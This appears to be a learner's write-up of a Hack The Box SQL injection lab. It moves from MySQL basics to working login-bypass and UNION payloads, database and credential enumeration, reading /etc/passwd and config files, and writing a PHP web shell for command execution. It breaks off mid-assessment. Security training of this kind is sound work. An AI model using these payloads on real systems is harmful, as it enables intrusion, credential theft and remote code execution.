# HTB: SQL Injection Fundamentals Module
# **MySQL**

## **Intro to MySQL**

Connect to remote database using `mysql`command 

```bash
mysql -u root -h 94.237.53.219 -P 42661 -p --skip-ssl
```

create users database

```bash
CREATE DATABASE users;
```

query for the newly created database

```bash
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| employees          |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
```

use users database and create a new table called logins

```bash
MariaDB [(none)]> USE users;
Database changed
MariaDB [users]> CREATE TABLE logins (id INT, username VARCHAR(100), password VARCHAR(100), date_of_joining DATETIME);
Query OK, 0 rows affected (0.105 sec)

MariaDB [users]> SHOW TABLES;
+-----------------+
| Tables_in_users |
+-----------------+
| logins          |
+-----------------+
1 row in set (0.104 sec)

```

List the table structure with the `DESCRIBE`command

```bash
MariaDB [users]> DESCRIBE logins;
+-----------------+--------------+------+-----+---------+-------+
| Field           | Type         | Null | Key | Default | Extra |
+-----------------+--------------+------+-----+---------+-------+
| id              | int(11)      | YES  |     | NULL    |       |
| username        | varchar(100) | YES  |     | NULL    |       |
| password        | varchar(100) | YES  |     | NULL    |       |
| date_of_joining | datetime     | YES  |     | NULL    |       |
+-----------------+--------------+------+-----+---------+-------+
4 rows in set (0.098 sec)
```

To create another enhanced table with a proper properties, first delete the current logins table, then create a new one

```bash
MariaDB [users]> DROP TABLE logins;

MariaDB [users]> CREATE TABLE logins (
    -> id INT NOT NULL AUTO_INCREMENT,
    -> username VARCHAR(100) UNIQUE NOT NULL,
    -> password VARCHAR(100) NOT NULL,
    -> date_of_joining DATETIME DEFAULT NOW(),
    -> PRIMARY KEY (id)
    -> );
Query OK, 0 rows affected (0.212 sec)

MariaDB [users]> SHOW TABLES;
+-----------------+
| Tables_in_users |
+-----------------+
| logins          |
+-----------------+

MariaDB [users]> DESCRIBE logins;
+-----------------+--------------+------+-----+---------------------+----------------+
| Field           | Type         | Null | Key | Default             | Extra          |
+-----------------+--------------+------+-----+---------------------+----------------+
| id              | int(11)      | NO   | PRI | NULL                | auto_increment |
| username        | varchar(100) | NO   | UNI | NULL                |                |
| password        | varchar(100) | NO   |     | NULL                |                |
| date_of_joining | datetime     | YES  |     | current_timestamp() |                |
+-----------------+--------------+------+-----+---------------------+----------------+
4 rows in set (0.117 sec)

```

## **SQL Statements**

INSERT VALUES into tables

```bash
MariaDB [users]> INSERT INTO logins VALUES (
    -> 1,
    -> 'admin',
    -> 'test1234',
    -> '2025-12-29'
    -> );
    
# we can skipping columns with default values, such as id and date_of_joining
MariaDB [users]> INSERT INTO logins VALUES (NULL, 'aisha12', 'pass1234', NULL);

# third method: 
MariaDB [users]> INSERT INTO logins (username, password) VALUES ('test13', 'qwrtdd');

# insert multiple records in one line
INSERT INTO logins (username, password) VALUES ('test14', '33333'), ('tom', 'tom123!');

```

Query table values

```bash
MariaDB [users]> SELECT * FROM logins;
+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  1 | admin    | test1234 | 2025-12-29 00:00:00 |
|  2 | aisha12  | pass1234 | NULL                |
|  3 | test13   | qwrtdd   | 2025-12-29 09:06:21 |
|  4 | test14   | 33333    | 2025-12-29 09:08:40 |
|  5 | tom      | tom123!  | 2025-12-29 09:08:40 |
+----+----------+----------+---------------------+
5 rows in set (0.109 sec)

```

`ALTER`command to modify the table

```sql
# Add new columm
ALTER TABLE logins ADD newColumn INT;

# Rename a column
ALTER TABLE logins RENAME COLUMN newColumn TO newer;

# Modify columns datatype
ALTER TABLE logins MODIFY newer DATE;

# Delete column
ALTER TABLE logins DROP newer;

```

`UPDATE`command

```bash
MariaDB [users]> select * from logins WHERE id=2;
+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  2 | aisha12  | pass1234 | NULL                |
+----+----------+----------+---------------------+

# we want to update the timedate in the second row, to set to now
MariaDB [users]> UPDATE logins SET date_of_joining = NOW() WHERE id = 2;

# Update table
MariaDB [users]> select * from logins WHERE id=2;
+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  2 | aisha12  | pass1234 | 2025-12-29 09:20:59 |
+----+----------+----------+---------------------+

```

QUERY 

```sql
# order by time
SELECT * FROM logins ORDER BY date_of_joining;

# order by time in ascending order
SELECT * FROM logins ORDER BY date_of_joining DESC;

# sort and limit the result
SELECT * FROM logins ORDER BY password DESC LIMIT 2;
 
# limit the result with offset, show result from 2 to 5 (note that the order start from 0)
SELECT * FROM logins  LIMIT 2, 5;
 
# WHERE Clause
SELECT * FROM logins WHERE id > 3 and username = 'tom';

# The % symbol acts as a wildcard and matches all characters after typed username
SELECT * FROM logins WHERE id > 3 OR username LIKE 'ai%';

# the _ symbol is used to match exactly one character
SELECT * FROM logins WHERE username LIKE '___';

```

**Challenge**: What is the last name of the employee whose first name starts with "Bar" AND who was hired on 1990-01-01?                      

```bash
# first use the database we want to query
MariaDB [users]> use employees 

# then view the tables
MariaDB [employees]> show tables;
+----------------------+
| Tables_in_employees  |
+----------------------+
| current_dept_emp     |
| departments          |
| dept_emp             |
| dept_emp_latest_date |
| dept_manager         |
| employees            |
| salaries             |
| titles               |
+----------------------+

# view the structure of the table to query for specifc column
MariaDB [employees]> DESCRIBE employees;
+------------+---------------+------+-----+---------+-------+
| Field      | Type          | Null | Key | Default | Extra |
+------------+---------------+------+-----+---------+-------+
| emp_no     | int(11)       | NO   | PRI | NULL    |       |
| birth_date | date          | NO   |     | NULL    |       |
| first_name | varchar(14)   | NO   |     | NULL    |       |
| last_name  | varchar(16)   | NO   |     | NULL    |       |
| gender     | enum('M','F') | NO   |     | NULL    |       |
| hire_date  | date          | NO   |     | NULL    |       |
+------------+---------------+------+-----+---------+-------+

# then finally query for the specifc employee
MariaDB [employees]> SELECT * FROM employees WHERE first_name LIKE 'Bar%'AND hire_date= '1990-01-01';
+--------+------------+------------+-----------+--------+------------+
| emp_no | birth_date | first_name | last_name | gender | hire_date  |
+--------+------------+------------+-----------+--------+------------+
|  10227 | 1953-10-09 | Barton     | Mitchem   | M      | 1990-01-01 |
+--------+------------+------------+-----------+--------+------------+

```

So the last name is **Mitchem**

OPERATORS 

```sql
# AND Operator
SELECT * FROM employees WHERE first_name = 'Barton' AND last_name = 'Mitchem';

# OR Operator
SELECT * FROM employees WHERE first_name = 'Barton' OR first_name LIKE 'ja%';

# NOT Operator
SELECT * FROM employees WHERE first_name = 'Barton' && gender!='F';

```

**Challenge**:In the 'titles' table, what is the number of records WHERE the employee number is greater than 10000 OR their title does NOT contain 'engineer'?                            

```sql
 SELECT emp_no, title FROM titles WHERE emp_no > 10000 OR title NOT LIKE 'engineer%';
```

# **Intro to SQL Injections**

Executing query on the login page: 

```sql
SELECT * FROM logins WHERE username='test' AND password = 'test'
```

SQLi Discovery: try to add one of the below payloads after the username and see if it causes any errors or changes how the page behaves:

| Payload | URL Encoded |
| --- | --- |
| `'` | `%27` |
| `"` | `%22` |
| `#` | `%23` |
| `;` | `%3B` |
| `)` | `%29` |

Test1: Send a post request with username ‘ 

```sql
username='&password=test
```

```sql
Executing query: SELECT * FROM logins WHERE username=''' AND password = 'test';
```

Result:

```sql
Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'test'' at line 1
```

Test2: using OR operator to bypass the AND clause of an existing user

```sql
username=admin'OR%20'1'='1&password=test
```

Executed Query:

```sql
SELECT * FROM logins WHERE username='admin'OR '1'='1' AND password = 'test';
```

Login success! 

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/1.png)

Test3: bypassing login to a non-existent user

```sql
username=test'OR%20'1'='1&password=
```

Executed query

```sql
SELECT * FROM logins WHERE username='NotAdmin'OR '1'='1' AND password = 'Something';
```

Here, the login failed because both conditions were false. 

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/2.png)

Test4: bypass login authentication to tom user

```sql
username=tom'OR%20'1'='1%20limit%201%20--&password=test
```

Executed query:

```sql
SELECT * FROM logins WHERE username='tom'OR '1'='1 limit 1 --' AND password = 'test';
```

test5: UNION Injection to query for table number

- **Note you have to add a space after the comment**

```sql
username=tom'%20UNION%20SELECT%20username,password%20FROM%20logins--%20&password=test
```

Executing query: :

```sql
SELECT * FROM logins WHERE username='tom' UNION SELECT username,password FROM logins-- ' AND password = 'test';
```

result:

```sql
Error: The used SELECT statements have a different number of columns
```

Test6:

```sql
username=tom'%20UNION%20SELECT%20username,password,NULL,NULL%20FROM%20logins--%20&password=test
```

Execured query

```sql
SELECT * FROM logins WHERE username='tom' UNION SELECT username,password,NULL,NULL FROM logins-- ' AND password = 'test';
```

result in success and now we now that logins table has 4 columns

Test7: Note that the symbol `#` can be used as a comment. To use (#) as a comment within a browser, we can use '%23', which is a URL-encoded (#) symbol.

```sql
username=tom'%20AND%201=0%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL#%20&password=test
```

Executed query

```sql
SELECT * FROM logins WHERE username='tom' AND 1=0 UNION ALL SELECT NULL,NULL,NULL,NULL# ' AND password = 'test';
```

result in login success as admin. If no user specified, the first user in the username column will be selected

Test8: Use comments to comment out the rest of the command

```sql
username=tom'%23'%20&password=test

# executed query
SELECT * FROM logins WHERE username='tom'#' ' AND password = 'test';
```

Test9: SQL supports the usage of parentheses if the application needs to check for particular conditions before others. Expressions within the parentheses take precedence over other operators and are evaluated first

```sql
username=tes&password=test

# executed query
SELECT * FROM logins WHERE (username='tes' AND id > 1) AND password = '098f6bcd4621d373cade4e832627b4f6';
```

The above query ensures that the user's id is always greater than 1, which will prevent anyone from logging in as admin. Additionally, we also see that the password was hashed before being used in the query. This will prevent us from injecting through the password field because the input is changed to a hash.

Test10: if we try to comment out the rest of the query:

```sql
username=tom'--%20&password=test  # ----- '

# Executed query
SELECT * FROM logins WHERE (username='tom'-- ' AND id > 1) AND password = '04a40f8a39b9ce980e95c565e0435178';
```

The login failed due to a syntax error, as a closed one did not balance the open parenthesis.

Test11: Close parenthesis, then comment the rest

```sql
username=tom')--%20&password=test
```

```sql
# Executing query
SELECT * FROM logins WHERE (username='tom')-- ' AND id > 1) AND password = '098f6bcd4621d373cade4e832627b4f6';
```

The query was successful, and we logged in as admin. 

**Challenge**: Log in as the user with the id 5 to get the flag. 

```sql
username=test')%20OR%20id%3D5--%20&password=test
```

Success!, Note `%3D` is `=` in URL encoding

```sql
# Executing query: 
SELECT * FROM logins WHERE (username='test') OR id=5-- ' AND id > 1) AND password = '098f6bcd4621d373cade4e832627b4f6';
```

- For more payloads → https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass

### UNION Clause

The Union clause is used to combine results from multiple `SELECT` statements. In this example, we will use the employees database

```sql
MariaDB [sys]> use employees
MariaDB [employees]> show tables;
+----------------------+
| Tables_in_employees  |
+----------------------+
| current_dept_emp     |
| departments          |
| dept_emp             |
| dept_emp_latest_date |
| dept_manager         |
| employees            |
| salaries             |
| titles               |
+----------------------+
8 rows in set (0.349 sec)
```

A `UNION` statement can only operate on `SELECT` statements with an equal number of columns. For example, if we attempt to `UNION` two queries that have results with a different number of columns, we get the following error:

```sql
MariaDB [employees]> SELECT * FROM employees UNION SELECT * FROM departments;
ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

```sql
# 6 fields
MariaDB [employees]> DESCRIBE employees;
+------------+---------------+------+-----+---------+-------+
| Field      | Type          | Null | Key | Default | Extra |
+------------+---------------+------+-----+---------+-------+
| emp_no     | int(11)       | NO   | PRI | NULL    |       |
| birth_date | date          | NO   |     | NULL    |       |
| first_name | varchar(14)   | NO   |     | NULL    |       |
| last_name  | varchar(16)   | NO   |     | NULL    |       |
| gender     | enum('M','F') | NO   |     | NULL    |       |
| hire_date  | date          | NO   |     | NULL    |       |
+------------+---------------+------+-----+---------+-------+
6 rows in set (0.142 sec)

# Two fields
MariaDB [employees]> DESCRIBE departments;
+-----------+-------------+------+-----+---------+-------+
| Field     | Type        | Null | Key | Default | Extra |
+-----------+-------------+------+-----+---------+-------+
| dept_no   | char(4)     | NO   | PRI | NULL    |       |
| dept_name | varchar(40) | NO   | UNI | NULL    |       |
+-----------+-------------+------+-----+---------+-------+
2 rows in set (0.124 sec)
```

**Even Columns**:

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

The above query would return `username` and `password` entries from the `passwords` table, assuming the `products` table has two columns.

another example: select two columns from the employees table to match the number of columns in the departments table which is 2

```sql
MariaDB [employees]> SELECT emp_no,first_name FROM employees UNION SELECT * FR
OM departments LIMIT 3;
+--------+------------+
| emp_no | first_name |
+--------+------------+
| 10001  | Georgi     |
| 10002  | Vivian     |
| 10003  | Temple     |
+--------+------------+
```

**Un-even Columns**

```sql
MariaDB [employees]> SELECT * FROM employees WHERE emp_no > 10600 UNION SELECT dept_no,dept_name,NULL,NULL,NULL,NULL FROM departments LIMIT 5;
+--------+------------+------------+-----------+--------+------------+
| emp_no | birth_date | first_name | last_name | gender | hire_date  |
+--------+------------+------------+-----------+--------+------------+
| 10601  | 1956-08-10 | Barton     | Soicher   | F      | 1986-02-21 |
| 10602  | 1960-02-06 | Conrado    | Koyama    | F      | 1989-02-19 |
| 10603  | 1953-05-24 | Cordelia   | Paludetto | M      | 1993-01-28 |
| 10604  | 1962-10-21 | Krister    | Stranks   | M      | 1987-01-31 |
| 10605  | 1964-07-15 | Weidon     | Gente     | F      | 1991-06-05 |
+--------+------------+------------+-----------+--------+------------+
5 rows in set (0.113 sec)
```

**challenge**:  find the number of records returned when doing a '`Union`' of all records in the '`employees`' table and all records in the '`departments`' table. 

Since the departments tables has two columns and the employees table has 6 columns, we will add junk data (null) to the departments table to match the employees’ column number

```sql
SELECT * FROM employees UNION SELECT dept_no,dept_name,NULL,NULL,NULL,NULL FROM departments;

```

The result was 663 rows

### UNION Injection

Testing subject: 

```sql
GET /search.php?port_code=CN+SHE HTTP/1.1
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/3.png)

Testing for SQLi by typing `‘` 

```
request:
GET /search.php?port_code=' HTTP/1.1
respone:
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1
```

### Detecting the number of columns

- using `UNION`
- using `ORDER BY`

Here I first used ORDER BY and kept incrementing the number till I got an error on number 5 

```
search.php?port_code='+order+by+4--%20 HTTP/1.1
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/4.png)

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/5.png)

Same thing with `UNION`

```
search.php?port_code='+UNION+SELECT+1,2,3,4--%20
```

 Once we know the number of columns, we know how to form our payload

**The location of the injection:** While a query may return multiple columns, the web application may only display some of them. So, if we inject our query in a column that is not printed on the page, we will not get its output. This is why we need to determine which columns are printed to the page, to determine where to place our injection. In the previous example, while the injected query returned 1, 2, 3, and 4, we saw only 2, 3, and 4 displayed back to us on the page as the output data: 

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/6.png)

Commonly, not every column will be displayed back to the user. For example, the ID field is often used to link different tables together, but the user doesn't need to see it. This tells us that columns 2 and 3, and 4 are printed to place our injection in any of them`We cannot place our injection at the beginning, or its output will not be printed.`

Example: return the version of the database by placing `@@version` command instead of junk data

```
search.php?port_code='+UNION+SELECT+1,@@version,3,4--%20
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/7.png)

**Challenge:**  Use a Union injection to get the result of 'user()' 

```
search.php?port_code='+UNION+SELECT+1,2,3,user()--%20

# add some filtering
search.php?port_code='+UNION+SELECT+1,2,3,user()+ORDER+BY+1+ASC+LIMIT+2--%20
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/8.png)

# **Exploitation**

## **MySQL Fingerprinting**

Before enumerating the database, we usually need to identify the type of DBMS we are dealing with. This is because each DBMS has different queries, and knowing what it is will help us know what queries to use. As an initial guess, if the web server running: 

- `Apache` or `Nginx` → DBMS is likely `MySQL`
- `IIS` → `MSSQL`

| Payload | When to Use | Expected Output | Wrong Output |
| --- | --- | --- | --- |
| `SELECT @@version` | When we have full query output | MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`' | In MSSQL it returns MSSQL version. Error with other DBMS. |
| `SELECT POW(1,1)` | When we only have numeric output | `1` | Error with other DBMS |
| `SELECT SLEEP(5)` | Blind/No Output | Delays page response for 5 seconds and returns `0`. | Will not delay response with other DBMS |

As we saw in the example from the previous section, when we tried `@@version`, it gave us:

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/9.jpeg)

The output `10.3.22-MariaDB-1ubuntu1` means that we are dealing with a `MariaDB`DBMS similar to MySQL. 

### INFORMATION_SCHEMA Database

To pull data from tables using `UNION SELECT`, We need to properly form our `SELECT` queries. To do so, we need the following information:

- List of databases
- List of tables within each database
- List of columns within each table

With the above information, we can form our `SELECT` statement to dump data from any column in any table within any database inside the DBMS. This is where we can utilize the `INFORMATION_SCHEMA` Database.

The INFORMATION_SCHEMA database contains metadata about the databases and tables present on the server. This database plays a crucial role while exploiting SQL injection vulnerabilities. As this is a different database, we cannot call its tables directly with a `SELECT` statement. If we only specify a table's name for a `SELECT` statement, it will look for tables within the same database.

So, to reference a table present in another DB, we can use the dot ‘`.`’ operator. For example, to `SELECT` a table `users` present in a database named `my_database`, we can use:

```sql
SELECT * FROM my_database.users;
```

Similarly, we can look at tables present in the `INFORMATION_SCHEMA` Database.

### **SCHEMATA**

To start our enumeration, we should find what databases are available on the DBMS. The table SCHEMATA in the `INFORMATION_SCHEMA` database contains information about all databases on the server. 

- The `SCHEMA_NAME` column contains all the database names currently present.

```sql
UNION SELECT 1,2,schema_name,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/10.png)

The result printed the available database on the server

- Note: The first three databases are default MySQL databases and are present on any server, so we usually ignore them during DB enumeration. Sometimes there's a fourth 'sys' DB as well.

we see two databases, `ilfreight` and `dev`, apart from the default ones. 

return the current database with the `SELECT database()` query.

```sql
cn' UNION select 1,database(),2,3-- -
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/11.png)

### **TABLES**

To query a database other than the current one, in our case, we want to query the `dev` database but we first need to know its tables. To find all tables within a database, we can use the `TABLES` table in the `INFORMATION_SCHEMA` Database. The TABLES has multiple column, but we are interested in these two columns:

- `TABLE_SCHEMA`The name of the schema (database) to which the table belongs.
- `TABLE_NAME`The name of the table.

. For example, we can use the following payload to find the tables within the `dev` database:

Code: sql

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

This query means: select `TABLE_NAME`, `TABLE_SCHEMA` column from `INFORMATION_SCHEMA` database of the table name `TABLES` WHERE the table name called `dev`

```sql
search.php?port_code=4'UNION+SELECT+1,TABLE_NAME,TABLE_SCHEMA,4+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA%3D'dev'--%20
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/12.png)

We see four tables in the dev database, namely `credentials`, `framework`, `pages`, and `posts`. 

### **COLUMNS**

Now how can we query for the columns of the `credentials` table? we first need to know the columns name in this table and so, we will use the COLUMNS table from the `INFORMATION_SCHEMA` database, interested columns: 

- `TABLE_SCHEMA`The name of the schema (database) to which the table containing the column belongs.
- `TABLE_NAME`The name of the table containing the column.
- `COLUMN_NAME`The name of the column.

```sql
UNION SELECT 1,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='crednetials';
```

```sql
search.php?port_code=t'UNION SELECT 1,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='credentials'-- 
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/13.png)

The table has two columns named `username` and `password`. We can use this information and dump data from the table.

### Data

Now that we have all the information, we can form our `UNION` query to dump data of the `username` and `password` columns from the `credentials` table in the `dev` database

```sql
UNION SELECT 1,username,password,4 FROM dev.credentials;
```

```sql
search.php?port_code='UNION SELECT 1,username,password,4 FROM dev.credentials ORDER BY 1 LIMIT 4--
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/14.png)

### Challenge

What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?

We could just query: 

```sql
UNION SELECT 1,2,3,4 FROM ilfreight.users-- - 
```

But, I would like to go through the enumeration process one more

1. first print the current database
    
    ```sql
    UNION SELECT 1,2,3,database()-- -
    ```
    
2. dump the tables of that databse
    
    ```sql
    UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.TABLES WHERE
    table_schema='ilfreight' ORDER BY 1 ASC LIMIT 4-- -  
    ```
    
 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/15.png)
    
3. dump the columns inside the `users` table from the `ilfreight` database
    
    ```sql
    UNION SELECT 1,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' ORDER BY 1 ASC LIMIT3-- -
    ```
    
 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/16.png)
    
4. Now that we know the number and the column names in the `users` table which are (password, username, id), we can start the query. 
    
    ```sql
    UNION SELECT 1,username,password,4 FROM ilfreight.users ORDER BY 1 ASC LIMIT 3-- - 
    ```
    
 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/17.png)
    

Ans: `9da2c9bcdf39d8610954e0e11ea8f45f`

## **Reading Files**

- **Beyond data extraction:** SQL Injection can be used not only to read database tables but also to **read/write server files** and potentially achieve **remote code execution**, depending on privileges.
- **Privileges matter:**
    - Reading files requires the **FILE** privilege in MySQL/MariaDB.
    - Writing files is more restricted and usually requires higher privileges (often DBA).
- **Identify current DB user:**
    - Use queries like `SELECT USER()` or `SELECT CURRENT_USER()` via UNION injection.
- **Check user privileges:**
    - Verify superuser access with `SELECT super_priv FROM mysql.user`.
    - Enumerate all privileges using `information_schema.user_privileges`.
    - If **FILE** is present, file read/write may be possible.
- **Read files with `LOAD_FILE()`:**
    - `LOAD_FILE('/path/to/file')` reads files **if the MySQL OS user has permission**.
    - Example targets:
        - `/etc/passwd` → confirms file-read capability.
        - Web app source files (e.g., `/var/www/html/search.php`) → leaks application code.
- **Impact:**
    - Successful file reads can expose **credentials**, **application logic**, and **additional vulnerabilities**, significantly escalating the attack.

### Example:

Identify the current user

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

```sql
UNION SELECT 1,2,user,4 FROM mysql.user ORDER BY 1 ASC LIMIT 1-- -
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/18.png)

### Privileges

second: Now that we know our user, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:

```sql
'UNION SELECT 1,2,super_priv,4 FROM mysql.user ORDER BY 1 ASC LIMIT 1-- -
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/19.png)

The query returns `Y`, which means `YES`, indicating superuser privileges. We can also dump other privileges we have directly from the schema, with the following query:

```sql
UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges ORDER BY 1 ASC-- - 
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/20.png)

we can add `WHERE grantee="'root'@'localhost'"` to only show our current user `root` privileges

```sql
UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- - 
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/21.png)

### LOAD_FILE

Now that we know we have enough privileges to read local system files, let us do that using the `LOAD_FILE()` function.  The LOAD_FILE() function can be used in MariaDB / MySQL to read data from files.  The function takes in just one argument, which is the file name. The following query is an example of how to read the `/etc/passwd` file:

```sql
SELECT LOAD_FILE('/etc/passwd');
```

Example: 

```sql
UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/22.png)

Another example: if we want to read the current page source code, and since it is using Apache server, the default Apache web root is `/var/www/html`.

```sql
UNION SELECT 1,LOAD_FILE('/var/www/html/search.php'),3,4-- -
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/23.png)

The page ends up rendering the HTML code within the browser. The HTML source can be viewed by hitting `[Ctrl + U]`. You will see the PHP code in `<?php ...?>` 

```php
<?php
if (isset($_GET["port_code"])) {
$q = "Select * from ports where code like '%".$_GET["port_code"]."%'";

$result = mysqli_query($conn,$q);
if (!$result)
{
		die("</table></div><p style='font-size: 15px'>".mysqli_error($conn)."</p>");
}
while($row = mysqli_fetch_array($result))
  {
  echo "<tr><td style=\"width:400px\" colspan=3>".$row[1]."</td><td style=\"width:400px\" colspan=3>".$row[2]."</td><td style=\"width:450px\" colspan=3>".$row[3]."</tr>";
  }
}
?>
```

### Challenge:

We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password. 

I loaded the search.php file again and checked the page source, and found the `include` statement which is used in php to improt a file

```php
<?php include "config.php";
?>
```

query:

```sql
UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3,4-- -
```

Then check the page source 

```php
<?php

$config=array(
'DB_HOST'=>'localhost',
'DB_USERNAME'=>'root',
'DB_PASSWORD'=>'dB_pAssw0rd_iS_flag!',
'DB_DATABASE'=>'ilfreight'
);

$conn = mysqli_connect($config['DB_HOST'], $config['DB_USERNAME'], $config['DB_PASSWORD'], $config['DB_DATABASE']);

if (mysqli_connect_errno($conn))
  {
  	echo "Failed connecting. " . mysqli_connect_error() . "<br/>";
  }

?>
```

So the database password is `dB_pAssw0rd_iS_flag!`

## **Writing Files**

- **Requirements to write files in MySQL/MariaDB:**
    
    To successfully write files to the back-end server, all of the following must be true:
    
    1. The database user has the **FILE** privilege.
    2. The MySQL global variable **secure_file_priv** is **not set to NULL**.
    3. The DBMS has **write permissions** to the target directory on the operating system.
- **`secure_file_priv` role:**
    - Empty value → read/write allowed anywhere on the filesystem.
    - Specific directory → read/write only within that directory.
    - NULL → file read/write completely disabled.
        
        MariaDB often allows broader access by default, while MySQL commonly restricts it.
        
- **Checking configuration via SQL Injection:**
    
    The value of `secure_file_priv` can be retrieved from `information_schema.global_variables`, allowing an attacker to confirm whether file writing is possible and where it is allowed.
    
- **Writing files using SQL:**
    
    MySQL supports writing query results directly to disk using SQL statements, enabling:
    
    - Exporting database contents into files.
    - Writing arbitrary text or binary data to the server.
    - Creating files owned by the MySQL service account.
- **Security impact:**
    
    If file writing is allowed and the web root is writable, an attacker can upload a **server-side script** (e.g., PHP) and execute system commands through the web server.
    
- **Resulting access:**
    
    Successful exploitation leads to **command execution** on the server under the web server’s user account (e.g., `www-data`), marking a full compromise of the application host.
    

### Example:

Since we already confirmed that we have `FILE`privileges, query if the MySQL global variable **`secure_file_priv`** is **not set to NULL**.

```sql
UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.gloable_variables WHERE variable_name='secure_file_priv'-- -
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/24.png)

And the result shows that the `secure_file_priv` value is empty, meaning that we can read/write files to any location.

```sql
UNION SELECT 1,LOAD_FILE('/etc/nginx/nginx.conf'),3,4-- -
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/25.png)

- **Note:** To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using this wordlist for Linux or this wordlist for Windows. Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

Now that we know the webroot, write into a file in the current directory

```sql
UNION SELECT 1,'File written successfully!',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -
```

Then view the file

```sql
UNION SELECT 1,LOAD_FILE('/var/www/html/proof.txt'),3,4-- - 
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/26.png)

- Note: We see the string we dumped along with '1', '3' before it, and '4' after it. This is because the entire 'UNION' query result was written to the file. To make the output cleaner, we can use "" instead of numbers.
    
    

### Web Shell

Writing a web shell into the current directory by specifying the `system`function to allow for RCE via the queried parameter

```sql
UNION SELECT 1,"<?php system($_REQUEST[cmd]); ?>",3,4 INTO OUTFILE '/var/www/html/webshell.php'-- -
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/27.png)

Challenge: Find the flag by using a webshell. 

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/28.png)

## **Skills Assessment - SQL Injection Fundamentals**

I first selected the target endpoint, which was the register endpoint. It appears that we cannot register a user without a valid invitation code. So I tried to bypass this authentication mechanism: 

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/s1.png)

```sql
username=test&password=test1122%24&repeatPassword=test1122%24&invitationCode=abcd-efgh-1234')+OR+'1'='1'--%20
```

In the search parameter, I tested for SQLi,  and it will return 200 or 500 based on the query I type: for example, this test returned 200

```sql
